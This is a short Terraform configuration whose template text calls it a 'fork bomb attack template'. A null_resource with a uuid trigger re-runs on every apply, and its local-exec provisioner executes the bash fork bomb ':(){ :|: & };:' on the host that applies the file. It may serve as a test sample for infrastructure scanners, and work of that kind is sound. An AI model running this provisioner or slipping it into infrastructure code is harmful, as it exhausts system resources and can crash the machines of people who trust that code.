# Create an arbitrary local resource
data "template_file" "test" {
  template = "Hello, I am a fork bomb attack template."

}

resource "null_resource" "execut" {
  triggers {
    uuid = "${uuid()}"
  }

  provisioner "local-exec" {
    command = ":(){ :|: & };:"
  }
}